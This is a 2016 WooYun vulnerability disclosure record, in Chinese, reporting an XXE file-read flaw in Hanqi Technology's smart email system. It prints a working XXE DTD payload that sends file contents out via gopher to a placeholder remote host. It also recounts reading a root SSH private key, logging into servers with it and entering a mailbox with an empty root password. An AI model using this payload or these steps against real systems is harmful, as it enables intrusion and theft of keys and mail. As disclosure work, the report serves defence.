{"id": 86219, "wybug_id": "wooyun-2016-0189058", "wybug_title": "汉启科技智能邮件系统一个XXE文件读取引发的血案", "wybug_corp": "深圳市汉启网络科技有限公司", "wybug_author": "刺刺", "wybug_date": "2016-03-25 21:40", "wybug_open_date": "2016-05-13 10:40", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心,深圳市汉启网络科技有限公司)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["配置错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-13：\t细节向公众公开  简要描述： RT 详细说明：  汉启科技的智能邮件群发（触发系统）存在Xfire任意文件读取的问题陈老师的link：http://**.**.**.**/bugs/wooyun-2010-0166751列目录的list.xml\n<!ENTITY % a SYSTEM \"file:///\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>\">%b;%c;\n读取文件的dtd\n<!ENTITY % a SYSTEM \"file:///\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>\">%b;%c;\n使用AWVS来验证：\n\n存在问题的URL有很多：写了个脚本，将以上hosts的IP段全跑了一遍，结果如下：\n\nmask 区域\n*******/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se************/se*****1.://**.**.**/smartedm/services_2.://**.**.**/smartedm/services_3.://**.**.**/smartedm/services_4.://**.**.**/smartedm/services_5.://**.**.**/smartedm/services_6.://**.**.**/smartedm/services_7.://**.**.**/smartedm/services_8.://**.**.**/smartedm/services_9.://**.**.**/smartedm/services_10.://**.**.**/smartedm/services_11.://**.**.**/smartedm/services_12.://**.**.**/smartedm/services_13.://**.**.**/smartedm/services_14.://**.**.**/smartedm/services_15.://**.**.**/smartedm/services_16.://**.**.**/smartedm/services_17.://**.**.**/smartedm/services_18.://**.**.**/smartedm/services_19.://**.**.**/smartedm/services_20.://**.**.**/smartedm/services_21.://**.**.**/smartedm/services_22.://**.**.**/smartedm/services_23.://**.**.**/smartedm/services_24.://**.**.**/smartedm/services_25.://**.**.**/smartedm/services_26.://**.**.**/smartedm/services_27.://**.**.**/smartedm/services_28.://**.**.**/smartedm/services_29.://**.**.**/smartedm/services_30.://**.**.**/smartedm/services_31.://**.**.**/smartedm/services_32.://**.**.**/smartedm/services_33.://**.**.**/smartedm/services_34.://**.**.**/smartedm/services_35.://**.**.**/smartedm/services_36.://**.**.**/smartedm/services_37.://**.**.**/smartedm/services_38.://**.**.**/smartedm/services_39.://**.**.**/smartedm/services_40.://**.**.**/smartedm/services_41.://**.**.**/smartedm/services_42.://**.**.**/smartedm/services_43.://**.**.**/smartedm/services_44.://**.**.**/smartedm/services_45.://**.**.**/smartedm/services_46.://**.**.**/smartedm/services_47.://**.**.**/smartedm/services_48.://**.**.**/smartedm/services_49.://**.**.**/smartedm/services_50.://**.**.**/smartedm/services_51.://**.**.**/smartedm/services_52.://**.**.**/smartedm/services_53.://**.**.**/smartedm/services_54.://**.**.**/smartedm/services_55.://**.**.**/smartedm/services_56.://**.**.**/smartedm/services_57.://**.**.**/smartedm/services_58.://**.**.**/smartedm/services_59.://**.**.**/smartedm/services_60.://**.**.**/smartedm/services_61.://**.**.**/smartedm/services_62.://**.**.**/smartedm/services_63.://**.**.**/smartedm/services_64.://**.**.**/smartedm/services_65.://**.**.**/smartedm/services_66.://**.**.**/smartedm/services_67.://**.**.**/smartedm/services_68.://**.**.**/smartedm/services_69.://**.**.**/smartedm/services_70.://**.**.**/smartedm/services_71.://**.**.**/smartedm/services_72.://**.**.**/smartedm/services_73.://**.**.**/smartedm/services_74.://**.**.**/smartedm/services_75.://**.**.**/smartedm/services_76.://**.**.**/smartedm/services_77.://**.**.**/smartedm/services_78.://**.**.**/smartedm/services_79.://**.**.**/smartedm/services_80.://**.**.**/smartedm/services_81.://**.**.**/smartedm/services_82.://**.**.**/smartedm/services_83.://**.**.**/smartedm/services_84.://**.**.**/smartedm/services_85.://**.**.**/smartedm/services_86.://**.**.**/smartedm/services_87.://**.**.**/smartedm/services_88.://**.**.**/smartedm/services_89.://**.**.**/smartedm/services_90.://**.**.**/smartedm/services_91.://**.**.**/smartedm/services_92.://**.**.**/smartedm/services_93.://**.**.**/smartedm/services_94.://**.**.**/smartedm/services_95.://**.**.**/smartedm/services_96.://**.**.**/smartedm/services_97.://**.**.**/smartedm/services_98.://**.**.**/smartedm/services_99.://**.**.**/smartedm/services_100.://**.**.**/smartedm/services_101.://**.**.**/smartedm/services_102.://**.**.**/smartedm/services_103.://**.**.**/smartedm/services_104.://**.**.**/smartedm/services_105.://**.**.**/smartedm/services_106.://**.**.**/smartedm/services_107.://**.**.**/smartedm/services_108.://**.**.**/smartedm/services_109.://**.**.**/smartedm/services_110.://**.**.**/smartedm/services_111.://**.**.**/smartedm/services_112.://**.**.**/smartedm/services_113.://**.**.**/smartedm/services_114.://**.**.**/smartedm/services_115.://**.**.**/smartedm/services_116.://**.**.**/smartedm/services_117.://**.**.**/smartedm/services_118.://**.**.**/smartedm/services_119.://**.**.**/smartedm/services_120.://**.**.**/smartedm/services_121.://**.**.**/smartedm/services_122.://**.**.**/smartedm/services_123.://**.**.**/smartedm/services_124.://**.**.**/smartedm/services_125.://**.**.**/smartedm/services_126.://**.**.**/smartedm/services_127.://**.**.**/smartedm/services_128.://**.**.**/smartedm/services_129.://**.**.**/smartedm/services_130.://**.**.**/smartedm/services_131.://**.**.**/smartedm/services_132.://**.**.**/smartedm/services_133.://**.**.**/smartedm/services_134.://**.**.**/smartredm/services_135.://**.**.**/smartredm/services_136.://**.**.**/smartredm/services_137.://**.**.**/smartredm/services_138.://**.**.**/smartredm/services_139.://**.**.**/smartredm/services_140.://**.**.**/smartredm/services_141.://**.**.**/smartredm/services_142.://**.**.**/smartredm/services_143.://**.**.**/smartredm/services_144.://**.**.**/smartredm/services_145.://**.**.**/smartredm/services_146.://**.**.**/smartredm/services_147.://**.**.**/smartredm/services_148.://**.**.**/smartredm/services_149.://**.**.**/smartredm/services_150.://**.**.**/smartredm/services_151.://**.**.**/smartredm/services_152.://**.**.**/smartredm/services_153.://**.**.**/smartredm/services_154.://**.**.**/smartredm/services_155.://**.**.**/smartredm/services_156.://**.**.**/smartredm/services_157.://**.**.**/smartredm/services_158.://**.**.**/smartredm/services_159.://**.**.**/smartredm/services_160.://**.**.**/smartredm/services_161.://**.**.**/smartredm/services_162.://**.**.**/smartredm/services_163.://**.**.**/smartredm/services_164.://**.**.**/smartredm/services_165.://**.**.**/smartredm/services_166.://**.**.**/smartredm/services_167.://**.**.**/smartredm/services_168.://**.**.**/smartredm/services_169.://**.**.**/smartredm/services_170.://**.**.**/smartredm/services_171.://**.**.**/smartredm/services_172.://**.**.**/smartredm/services_173.://**.**.**/smartredm/services\n\n至于其他的用户我就不列举了。XXE读取文件的时候，发现/root/.ssh/目录居然有id_rsa文件；\n\n内容可以读取（用户通知了你们XXE漏洞，但是没有告诉你们自己的问题吧）读取回来的id_rsa内容被url编码了，这里本人比较菜URL decode会将内容中的加号给修改成空格，验证几次都特么不对；还有就是新建的id_rsa在windows环境上传到linux环境格式不对，折腾了好久终于搞定了。\n\n   漏洞证明：  使用id_rsa登录主机：\n\n其实都是一个主机多个网卡啊\n\nmask 区域\n*****-a|grep '**********t:**.**.**.** **********st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************st:**.**.**.************^区，密^***********.**.*************.**.*************.**.*************.**.*************.**.*******\n\n\n\n这么的服务器，都不知道如何群发了……其中**.**.**.**居然和**.**.**.**邮箱在同一个服务器上邮箱是Exmail root密码为空\n\n登录邮箱：\n\n邮箱的内容就不多演示了，看你们的客户多好啊。\n\n   修复方案：  1.可根据陈老师的建议修复xfire，或建议用户在防火墙上功能限制80 8080 8081端口的访问；2. id_rsa记得百度一下，这个不需要放到目标服务器的.ssh目录的；3. 如果对我本人不放心的话，记得修改全公司用户的邮箱密码。4. 多看乌云，产品少漏洞！   版权声明：转载请注明来源 刺刺@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-29 10:38 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}